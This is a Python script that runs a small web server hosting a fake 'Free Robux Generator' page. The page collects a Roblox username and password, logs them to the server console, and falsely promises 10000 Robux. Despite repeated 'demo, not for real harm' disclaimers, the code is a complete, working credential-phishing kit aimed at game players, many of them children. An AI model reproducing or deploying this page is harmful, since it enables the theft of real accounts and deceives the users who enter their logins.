# -*- coding: utf-8 -*-
# Skript: prostoy HTTP-server dlya demo (NE DLYa REALNOGO VREDA)
# Avtor: palofsc
# Python 3.10+

import http.server
import socketserver
import json
import urllib.parse

PORT = 8080

class RobuxHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            html = self._get_html()
            self.wfile.write(html.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/claim':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = urllib.parse.parse_qs(post_data.decode('utf-8'))
            # Imitatsiya obrabotki (logirovanie v konsol)
            print("[LOG] Polucheny dannye:", data)
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            response = {"status": "ok", "message": "Zayavka prinyata, robux budet nachislen v techenie 24 chasov (eto demo)"}
            self.wfile.write(json.dumps(response).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def _get_html(self):
        return """<!DOCTYPE html>
<html>
<head><title>Free Robux Generator (DEMO)</title></head>
<body style="background:#111;color:#0f0;font-family:monospace;padding:20px;">
<center>
<h2>BEZPLATNYE ROBUX GENERATOR</h2>
<p>Eto DEMO-versiya, ne obmanyvayte sebya</p>
<form id="f">
<input type="text" id="user" placeholder="Username Roblox" required><br>
<input type="password" id="pass" placeholder="Password" required><br>
<button type="submit">Poluchit 10000 Robux</button>
</form>
<div id="res"></div>
<script>
document.getElementById('f').onsubmit = async(e) => {
    e.preventDefault();
    let u = document.getElementById('user').value;
    let p = document.getElementById('pass').value;
    let resDiv = document.getElementById('res');
    resDiv.innerText = 'Otpravka...';
    let resp = await fetch('/claim', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'username='+encodeURIComponent(u)+'&password='+encodeURIComponent(p)
    });
    let json = await resp.json();
    resDiv.innerText = json.message;
};
</script>
</center>
</body>
</html>"""

if __name__ == '__main__':
    with socketserver.TCPServer(("", PORT), RobuxHandler) as httpd:
        print(f"[INFO] Server zapushchen na portu {PORT}")
        print("[WARNING] Eto demo. Ne ispolzovat dlya realnogo vreda ili obmana.")
        httpd.serve_forever()
